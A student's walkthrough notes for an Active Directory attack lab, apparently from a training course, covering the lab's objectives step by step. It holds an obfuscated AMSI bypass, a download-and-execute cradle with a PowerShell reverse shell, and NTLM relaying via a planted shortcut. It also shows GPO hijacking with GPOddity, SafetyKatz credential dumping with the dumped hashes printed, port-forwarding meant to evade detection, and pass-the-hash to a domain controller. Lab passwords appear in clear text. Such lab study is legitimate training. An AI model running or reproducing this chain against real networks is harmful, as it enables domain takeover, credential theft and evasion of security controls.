## Summary
0. Instructions
   - AMSI Bypass
   - Invisi-Shell
   - Turn-off Firewall
1. [Objective 1](#objective-1)
    - Users
    - Computers
    - Domain Administrators
    - Enterprise Administrators
    - Use BloodHound to identify the shortest path to Domain Admins in the dollarcorp domain.
    - Find a file share where studentx has Write permissions
2. [Objective 2](#objective-2)
    - ACL for the Domain Admins group
    - ACLs where studentx has interesting permissions
    - Analyze the permissions for studentx in BloodHound UI

## Instructions
* All commands is running by PowerView
* Please remember to turn-off or add an exception to your student VMs firewall when your run listener for a reverse shell
* Using Invisi-Shell to avoid enhanced logging
* AMSI bypass
```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## Objective 1
```
Enumerate following for the dollarcorp domain:
− Users
− Computers
− Domain Administrators
− Enterprise Administrators
• Use BloodHound to identify the shortest path to Domain Admins in the dollarcorp domain.
• Find a file share where studentx has Write permissions.
```
### Invisi-Shell
* C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

### Import PowerView
* C:\AD\Tools> . .\PowerView.ps1

### Return all users or specific user objects in AD
* Get-DomainUser
* Get-DomainUser | select -ExpandProperty samaccountname

### Member computers
* Get-DomainComputer | select -ExpandProperty dnshostname
```
dcorp-dc.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
```

### Details of the Domain Admins group 
* Get-DomainGroup -Identity "Domain Admins"

### Enumerate members of the Domain Admins group
* Get-DomainGroupMember -Identity "Domain Admins"
* Get-DomainGroupMember -Identity "Enterprise Admins"
* Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local

### BloodHound ingestores
* C:\AD\Tools\BloodHound-master\BloodHoundmaster\Collectors\SharpHound.exe --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL Container,ObjectProps,SPNTargets --excludedcs

### File with all servers
* Get-DomainComputer | select -ExpandProperty cn | Out-File -FilePath .\servers.txt
* cat C:\AD\Tools\servers.txt 
```
DCORP-ADMINSRV 
DCORP-APPSRV 
DCORP-CI 
DCORP-MGMT 
DCORP-MSSQL 
DCORP-SQL1
DCORP-STDADMIN
DCORP-STD2
DCORP-STUDENT1
```

### File share where studentx has Write permissions, Use the PowerHuntShares to search for file shares.
* Import-Module C:\AD\Tools\PowerHuntShares.psm1
* Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt
```
with the top 200 share names.
[*][12/24/2024 04:02] - 2 ADMIN$
[*][12/24/2024 04:02] - 2 C$
[*][12/24/2024 04:02] - 1 studentshare2
[*][12/24/2024 04:02] - 1 AI
[*] -----------------------------------------------
[*][12/24/2024 04:02] - Generating HTML Report
[*][12/24/2024 04:02] - Estimated generation time: 1 minute or less
[*][12/24/2024 04:02] - All files written to C:\AD\Tools\\SmbShareHunt12242024040138
```

![alt text](image-6.png)

![alt text](image-7.png)

## Objective 2:
```
• Enumerate following for the dollarcorp domain:
− ACL for the Domain Admins group
− ACLs where studentx has interesting permissions
• Analyze the permissions for studentx in BloodHound UI
```

### Enumerate ACLs for the Domain Admins Group
* Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose

### Check for modify rights/permissions
* Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentx"} 
* Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
ObjectDN : 
CN=ControlxUser,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier : AccessAllowed
ActiveDirectoryRights : GenericAll
ObjectAceType : None
AceFlags : None
AceType : AccessAllowed
InheritanceFlags : None
SecurityIdentifier : S-1-5-21-719815819-3726368948-3917688648-1123
IdentityReferenceName : RDPUsers
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN : CN=RDP 
Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass : group
```

### Analyze the permissions for studentx using BloodHound UI
### Let’s look at the 'Outbound Object Control' for the studentx
```
Multiple permissions stand out in the above diagram. Due to the membership of the RDPUsers group, 
the studentx user has following interesting permissions
- Full Control/Generic All over supportx and controlx users. 
- Enrollment permissions on multiple certificate templates.
- Full Control/Generic All on the Applocked Group Policy.
```

![alt text](image.png)
![alt text](image-1.png)
![alt text](image-2.png)

## Objective 3
```
• Enumerate following for the dollarcorp domain:
− List all the OUs
− List all the computers in the DevOps OU
− List the GPOs 
− Enumerate GPO applied on the DevOps OU
− Enumerate ACLs for the Applocked and DevOps GPOs
```

### List all the OUs
* Get-DomainOU
* Get-DomainOU | select -ExpandProperty name
```
Domain Controllers
StudentMachines
Applocked
Servers
DevOps
```

### List all the computers in the DevOps OU
* (Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```
name
----
DCORP-CI
```

### List all the computers in the Applocked OU
* (Get-DomainOU -Identity Applocked).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```
name
----
DCORP-ADMINSRV
```

### List all the GPOs
* Get-DomainGPO
```
flags : 0
systemflags : -1946157056
displayname : Default Domain Policy
[snip]
flags : 0
displayname : DevOps Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-
3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged : 12/19/2024 12:00:15 PM
versionnumber : 3
name : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

### Enumerate GPO applied on the DevOps OU (we need the name of the policy from the gplink attribute from the OU)
* (Get-DomainOU -Identity DevOps).gplink
```
LDAP://cn={0BF8D01C-1F62-4BDC-958C-57140B67D147},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
```

### More informations about this GPO
* Get-DomainGPO -Identity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'
```
flags : 0
displayname : DevOps Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-
3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged : 12/19/2024 12:00:15 PM
versionnumber : 3
name : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
cn : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
usnchanged : 314489
dscorepropagationdata : {12/18/2024 7:31:56 AM, 1/1/1601 12:00:00 AM}
objectguid : fc0df125-5e26-4794-93c7-e60c6eecb75f
gpcfilesyspath : 
\\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0BF8
D01C-1F62-4BDC-958C-57140B67D147}
distinguishedname : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated : 12/18/2024 7:31:22 AM
showinadvancedviewonly : True
usncreated : 293100
gpcfunctionalityversion : 2
instancetype : 4
objectclass : {top, container, groupPolicyContainer}
objectcategory : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

### To enumerate the ACLs for the Applocked and DevOps GPO, let's use the BloodHound CE UI
![alt text](image-3.png)
![alt text](image-5.png)

**A user named 'devopsadmin' has 'WriteDACL' on DevOps Policy.**

## Objective 4
```
• Enumerate all domains in the moneycorp.local forest. 
• Map the trusts of the dollarcorp.moneycorp.local domain.
• Map External trusts in moneycorp.local forest. 
• Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
```

### Enumerate all domains in the current forest
* Get-ForestDomain -Verbose

### Map all the trusts of the dollarcorp domain
* Get-DomainTrust
```
SourceName : dollarcorp.moneycorp.local
TargetName : moneycorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 5:59:01 AM
WhenChanged : 2/24/2023 9:11:33 AM

SourceName : dollarcorp.moneycorp.local
TargetName : us.dollarcorp.moneycorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 6:22:51 AM
WhenChanged : 2/24/2023 9:09:58 AM

SourceName : dollarcorp.moneycorp.local
TargetName : eurocorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 8:15:23 AM
WhenChanged : 2/24/2023 9:10:52 AM
```

### list only the external trusts in the moneycorp.local forest
<p> * Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"} </p>

```
SourceName : dollarcorp.moneycorp.local
TargetName : eurocorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 8:15:23 AM
WhenChanged : 2/24/2023 9:10:52 AM
```

### Identify external trusts of the dollarcorp domain
*  Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```
SourceName : dollarcorp.moneycorp.local
TargetName : eurocorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 8:15:23 AM
WhenChanged : 2/24/2023 9:10:52 AM
```

**Since the above is a Bi-Directional trust, we can extract information from the eurocorp.local forest**
* Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}


## Objective 5
```
• Exploit a service on dcorp-studentx and elevate privileges to local administrator. 
• Identify a machine in the domain where studentx has local administrative access.
• Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.
```

### Local Privilege Escalation - PowerUp
**We can use Powerup from PowerSploit module to check for any privilege escalation path. Feel free to use other tools mentioned in the class like WinPEAS**

* . C:\AD\Tools\PowerUp.ps1
* Invoke-AllChecks
```
[*] Running Invoke-AllChecks
[*] Checking if user is in a local group with administrative privileges...
[*] Checking for unquoted service paths...
ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; 
IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'AbyssWebServer' -Path 
<HijackPath>
CanRestart : True
ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; 
IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'AbyssWebServer' -Path 
<HijackPath>
CanRestart : True
[snip]

[*] Checking service executable and argument permissions...
ServiceName : AbyssWebServer
AlteredSecurity Attacking and Defending Active Directory 35
Path : C:\WebServer\Abyss Web Server\abyssws.exe -
service
ModifiableFile : C:\WebServer\Abyss Web Server
ModifiableFilePermissions : {WriteOwner, Delete, WriteAttributes, 
Synchronize...}
ModifiableFileIdentityReference : Everyone
StartName : LocalSystem
AbuseFunction : Install-ServiceBinary -Name 
'AbyssWebServer'
CanRestart : True

[snip]
[*] Checking service permissions...
ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
StartName : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'
CanRestart : True
```

### Abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group

*  Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student731' -Verbose
```
VERBOSE: Service 'AbyssWebServer' original path: 'C:\WebServer\Abyss Web Server\abyssws.exe -service'
VERBOSE: Service 'AbyssWebServer' original state: 'Stopped'
VERBOSE: Executing command 'net localgroup Administrators dcorp\student1 /add'
VERBOSE: binPath for AbyssWebServer successfully set to 'net localgroup Administrators dcorp\studentx /add'
```

* net localgroup Administrators
```
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
dcorp\Domain Admins
dcorp\student731
The command completed successfully.
```

**We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!**

### Hunt for Local Admin access

**To identify a machine in the domain where studentx has local administrative access, use Find-PSRemotingLocalAdminAccess.ps1**

* . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
* Find-PSRemotingLocalAdminAccess
```
dcorp-adminsrv
```

**Studentx has administrative access on dcorp-adminsrv and on the student machine.** 
**We can connect to dcorp-adminsrv using winrs as the student user**

* winrs -r:dcorp-adminsrv cmd
```
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
```

* set username
```
set username
USERNAME=studentx
```

* set computername
```
computername
COMPUTERNAME=dcorp-adminsrv
```

**PowerShell Remoting**
* Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

* [dcorp-adminsrv.dollarcorp.moneycorp.local]C:\Users\studentx\Documents>$env:username
```
dcorp\studentx
```

## Abuse Jenkins Instance
**We have a misconfigured Jenkins instance on dcorp-ci (http://172.16.3.11:8080)**
**Use the encodedcomand parameter of PowerShell to use an encoded reverse shell or use download execute cradle in Jenkins build step.**

### First, You need scan the networks

**On linux VM, run nmap scan**

* nmap -Pn -vvv 172.16.4.0/24 --min-rate=1000
* nmap -Pn -vvv 172.16.3.0/24 --min-rate=1000
```
Nmap scan report for 172.16.3.11
Host is up, received user-set (0.23s latency).
Scanned at 2025-09-22 12:19:29 EDT for 127s
Not shown: 719 closed tcp ports (reset), 276 filtered tcp ports (no-response)
PORT     STATE SERVICE      REASON
135/tcp  open  msrpc        syn-ack ttl 127
139/tcp  open  netbios-ssn  syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
5985/tcp open  wsman        syn-ack ttl 127
8080/tcp open  http-proxy   syn-ack ttl 127


Nmap scan report for 172.16.3.81
Host is up, received user-set (0.26s latency).
Scanned at 2025-09-22 12:21:40 EDT for 130s
Not shown: 706 closed tcp ports (reset), 289 filtered tcp ports (no-response)
PORT     STATE SERVICE      REASON
135/tcp  open  msrpc        syn-ack ttl 127
139/tcp  open  netbios-ssn  syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
1433/tcp open  ms-sql-s     syn-ack ttl 127
5985/tcp open  wsman        syn-ack ttl 127


Nmap scan report for 172.16.4.217
Host is up, received user-set (0.24s latency).
Scanned at 2025-09-22 12:38:29 EDT for 130s
Not shown: 709 closed tcp ports (reset), 288 filtered tcp ports (no-response)
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127


Nmap scan report for 172.16.4.101
Host is up, received user-set (0.24s latency).
Scanned at 2025-09-22 12:34:09 EDT for 131s
Not shown: 706 closed tcp ports (reset), 290 filtered tcp ports (no-response)
PORT     STATE SERVICE      REASON
135/tcp  open  msrpc        syn-ack ttl 127
139/tcp  open  netbios-ssn  syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
5985/tcp open  wsman        syn-ack ttl 127


Nmap scan report for 172.16.4.44
Host is up, received user-set (0.40s latency).
Scanned at 2025-09-22 12:31:58 EDT for 131s
Not shown: 714 closed tcp ports (reset), 282 filtered tcp ports (no-response)
PORT     STATE SERVICE      REASON
135/tcp  open  msrpc        syn-ack ttl 127
139/tcp  open  netbios-ssn  syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
1433/tcp open  ms-sql-s     syn-ack ttl 127
```

**Manually trying the usernames as passwords we can identify that the user builduser has password builduser.**

![alt text](image-48.png)

* powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443

**make sure to add an exception or turn off the firewall on the student VM.**
**You can find hfs.exe in the C:\AD\Tools directory of your student VM. Note that HFS goes in the system tray when minimized**

* C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443

![alt text](image-11.png)

![alt text](image-8.png)

![alt text](image-9.png)

![alt text](image-10.png)

![alt text](image-12.png)

* PS C:\Users\Administrator\.jenkins\workspace\Project0> $env:username
```
Ciadmin
```
* PS C:\Users\Administrator\.jenkins\workspace\Project0>$env:computername

## Objective 6
```
Abuse an overly permissive Group Policy to add studentx to the local administrators group on dcorp-ci.
```

### In Learning-Objective 1, we enumerated that there is a directory called 'AI' on the dcorp-ci machine where 'Everyone' has access Looking at the directory (\\\dcorp-ci\AI), we will find a log file

![alt text](image-13.png)

![alt text](image-14.png)

### It turns out that the 'AI' folder is used for testing some automation that executes shortcuts (.lnk files) as the user 'devopsadmin'. Recall that we enumerated a user 'devopsadmin' has 'WriteDACL' on DevOps Policy. Let's try to abuse this using GPOddity

### First, we will use ntlmrelayx tool from Ubuntu WSL instance on the student VM to relay the credentials of the devopsadmin user.

* Use WSLToTh3Rescue! as the sudo password.

* wsluser@dcorp-studentx:/mnt/c/Users/studentx$> sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server

![alt text](image-15.png)

### On the student VM, let's create a Shortcut that connects to the ntlmrelayx listener. 
### Go to C:\AD\Tools -> Right Click -> New -> Shortcut. Copy the following command in the Shortcut location:

* C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke_WebRequest -Uri 'http://172.16.100.31' -UseDefaultCredentials"

![alt text](image-16.png)

![alt text](image-17.png)

**Copy shortcut to dcorp-ci**

* C:\AD\Tools>xcopy C:\AD\Tools\studentx.lnk \\\dcorp-ci\AI

### Connect to the ldap shell started on port 11000. Run the following command on a new Ubuntu WSL session

* wsluser@dcorp-studentx:/mnt/c/Users/studentx$> nc 127.0.0.1 11000

![alt text](image-18.png)

![alt text](image-19.png)

### Using this ldap shell, we will provide the studentx user, WriteDACL permissions over Devops Policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}

* Get-DomainGPO | select displayname, name

![alt text](image-20.png)

![alt text](image-21.png)

![alt text](image-22.png)

* write_gpo_dacl student731 {0BF8D01C-1F62-4BDC-958C-57140B67D147}

![alt text](image-23.png)

### Now, run the GPOddity command to create the new template.

* wsluser@dcorp-studentx:/mnt/c/Users/studentx$> cd /mnt/c/AD/Tools/GPOddity

```
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student731' --password 'rMszB5MwUBww29' --command 'net localgroup administrators student731 /add' --rogue-smbserver-ip '172.16.100.31' --rogue-smbserver-share 'std731-gp' --dc-ip '172.16.2.1' --smb-mode none
```

![alt text](image-24.png)


### Another Ubuntu WSL session, create and share the stdx-gp directory

* wsluser@dcorp-std731:/mnt/c/Users/student731$> mkdir /mnt/c/AD/Tools/std731-gp 
* wsluser@dcorp-std731:/mnt/c/Users/student731$> cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std731-gp

### From a command prompt (Run as Administrator) on the student VM, run the following commands to allow 'Everyone' full permission on the stdx-gp share

* C:\Windows\system32>net share stdx-gp=C:\AD\Tools\std731-gp
* icacls "C:\AD\Tools\std731-gp" /grant Everyone:F /T

**icacls Displays or modifies discretionary access control lists (DACLs) on specified files and applies stored DACLs to files in specified directories**

![alt text](image-25.png)

### Verify if the gPCfileSysPath has been modified for the DevOps Policy.

* Get-DomainGPO -Identity 'DevOps Policy'

### Before
![alt text](image-26.png)

### After
![alt text](image-27.png)

**After waiting for 2 minutes, studentx should be added to the local administrators group on dcorp-ci**

* C:\AD\Tools>winrs -r:dcorp-ci cmd /c "set computername && set username"
```
COMPUTERNAME=DCORP-CI
USERNAME=student731
```

* winrs -r:dcorp-ci cmd

![alt text](image-28.png)

## Objective 7
```
Identify a machine in the target domain where a Domain Admin session is available. 
• Compromise the machine and escalate privileges to Domain Admin by abusing reverse shell on 
dcorp-ci.
• Escalate privilege to DA by abusing derivative local admin through dcorp-adminsrv. On dcorp-adminsrv, tackle application allowlisting using: 
− Gaps in Applocker rules. 
− Disable Applocker by modifying GPO applicable to dcorp-adminsrv
```

### Identify a machine where Domain Admin session is available
**We have access to two domain users - student731 and ciadmin and administrative access to dcorp-adminsrv machine. User hunting has not been fruitful as student731**

### Enumeration using Invoke-SessionHunter to list sessions on all the remote machines
* . C:\AD\Tools\Invoke-SessionHunter.ps1
* Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
```
[+] Elapsed time: 0:0:51.674
HostName UserSession Access
-------- ----------- ------
dcorp-appsrv    dcorp\appadmin      False
dcorp-ci        dcorp\ciadmin       False
dcorp-mgmt      dcorp\mgmtadmin     False
dcorp-mssql     dcorp\sqladmin      False
dcorp-dc        dcorp\Administrator False
dcorp-mgmt      dcorp\svcadmin      False
dcorp-adminsrv  dcorp\appadmin      True
dcorp-adminsrv  dcorp\srvadmin      True
dcorp-adminsrv  dcorp\websvc        True
```

* Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access

**There is a domain admin (svcadmin) session on dcorp-mgmt server! We do not have access to the server but that comes late**

![alt text](image-29.png)

### We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.
**We can use Powerview’s Find-DomainUserLocation on the reverse shell to looks for machines where a domain admin is logged in. First, we must bypass AMSI and enhanced logging**

* PS C:\Users\Administrator\.jenkins\workspace\Project0> iex (iwr http://172.16.100.31/sbloggingbypass.txt -UseBasicParsing)

### bypass AMSI
```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

![alt text](image-30.png)

**Now, download and execute PowerView in memory of the reverse shell and run Find-DomainUserLocation. Check all the machines in the domain**

* iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.31/PowerView.ps1'))
* Find-DomainUserLocation

![alt text](image-32.png)

**There is a domain admin session on dcorp-mgmt server**

![alt text](image-49.png)

**Let’s check if we can execute commands on dcorp-mgmt server and if the winrm port is open**

* PS C:\Users\Administrator\.jenkins\workspace\Project0> winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```
COMPUTERNAME=DCORP-MGMT
USERNAME=ciadmin`
```

**We would now run SafetyKatz.exe on dcorp-mgmt to extract credentials from it. For that, we need to  copy Loader.exe on dcorp-mgmt Let's download Loader.exe on dcorp-ci and copy it from there to dcorp-mgmt. This is to avoid any downloading activity on dcorp-mgmt**

* PS C:\Users\Administrator\.jenkins\workspace\Project0>iwr http://172.16.100.31/Loader.exe -OutFile C:\Users\Public\Loader.exe

**Now, copy the Loader.exe to dcorp-mgmt**
* PS C:\Users\Administrator\.jenkins\workspace\Project0> echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```
Does \\dcorp-mgmt\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
AlteredSecurity Attacking and Defending Active Directory 50
(F = file, D = directory)? F
C:\Users\Public\Loader.exe
1 File(s) copied
```

**Add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt**
* PS C:\Users\Administrator\.jenkins\workspace\Project0> $null | winrs - r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"

**To run SafetyKatz on dcorp-mgmt, we will download and execute it in-memory using the Loader**

* PS C:\Users\Administrator\.jenkins\workspace\Project0> $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```
[snip]
Authentication Id : 0 ; 58866 (00000000:0000e5f2)
Session : Service from 0
User Name : svcadmin
Domain : dcorp
Logon Server : DCORP-DC
Logon Time : 12/5/2024 2:01:15 AM
SID : S-1-5-21-719815819-3726368948-3917688648-1118
 * Username : svcadmin
 * Domain : DOLLARCORP.MONEYCORP.LOCAL
 * Password : (null)
 * Key List :
 aes256_hmac 
6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
 rc4_hmac_nt b38ff50264b74508085d82c69794a4d8
 rc4_hmac_old b38ff50264b74508085d82c69794a4d8
 rc4_md4 b38ff50264b74508085d82c69794a4d8
 rc4_hmac_nt_exp b38ff50264b74508085d82c69794a4d8
 rc4_hmac_old_exp b38ff50264b74508085d82c69794a4d8
```

![alt text](image-33.png)

![alt text](image-34.png)

```
[snip]
Authentication Id : 0 ; 58866 (00000000:0000e5f2)
Session : Service from 0
User Name : svcadmin
Domain : dcorp
Logon Server : DCORP-DC
Logon Time : 12/5/2024 2:01:15 AM
SID : S-1-5-21-719815819-3726368948-3917688648-1118
 * Username : svcadmin
 * Domain : DOLLARCORP.MONEYCORP.LOCAL
 * Password : (null)
 * Key List :
 aes256_hmac 
6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
 rc4_hmac_nt b38ff50264b74508085d82c69794a4d8
 rc4_hmac_old b38ff50264b74508085d82c69794a4d8
 rc4_md4 b38ff50264b74508085d82c69794a4d8
 rc4_hmac_nt_exp b38ff50264b74508085d82c69794a4d8
 rc4_hmac_old_exp b38ff50264b74508085d82c69794a4d8

```

**We got credentials of svcadmin - a domain administrator. Note that svcadmin is used as a service account (see "Session" in the above output), so you can even get credentials in clear-text from lsasecrets**

### Find the proccess is using svcadmin account.
* $null | winrs -r:dcorp-mgmt "cmd /c tasklist /V | findstr "svcadmin"

![alt text](image-35.png)

### OverPass-the-Hash to replay svcadmin credentials
**use OverPass-the-Hash to use svcadmin's credentials**

**Run the commands below from an elevated shell on the student VM to use Rubeus**

* C:\Windows\system32>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

![alt text](image-36.png)

### Try accessing the domain controller from the new process
* C:\Windows\system32>winrs -r:dcorp-dc cmd /c set username
```
USERNAME=svcadmin`
```

![alt text](image-37.png)

**Note that we did not need to have direct access to dcorp-mgmt from the student VM.**

### Abuse Derivative Local Admin
**We need to escalate to domain admin using derivative local admin. Let’s find out the machines on which we have local admin privileges**

* PS C:\AD\Tools> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
* PS C:\AD\Tools> Find-PSRemotingLocalAdminAccess
```
dcorp-adminsrv
```

### Gaps in Applocker Policy

**Let's check if Applocker is configured on dcorp-adminsrv by querying registry keys. Note that we are assuming that reg.exe is allowed to execute**

* C:\AD\Tools>winrs -r:dcorp-adminsrv cmd
```
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.
```

* C:\Users\student731> reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Appx
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Dll
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Exe
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Msi
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script
```

**We can understand that Microsoft Signed binaries and scripts are allowed for all the users but nothing else**

![alt text](image-38.png)

**However, this particular rule is overly permissive**

